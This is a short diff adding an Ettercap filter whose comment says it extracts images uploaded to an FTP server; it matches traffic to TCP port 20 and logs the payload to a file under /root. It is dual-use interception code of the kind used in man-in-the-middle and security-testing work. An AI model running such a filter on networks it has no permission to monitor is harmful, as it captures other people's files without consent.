@@ -1,0 +1,10 @@
+##
+#
+#  Ettercap filter to extract a image which is uploaded to a FTP Server
+#
+##
+
+if (ip.proto == TCP && tcp.dst == 20) {
+    log(DATA.data, "/root/captured-img.jpg");
+    msg("Found image!");
+}
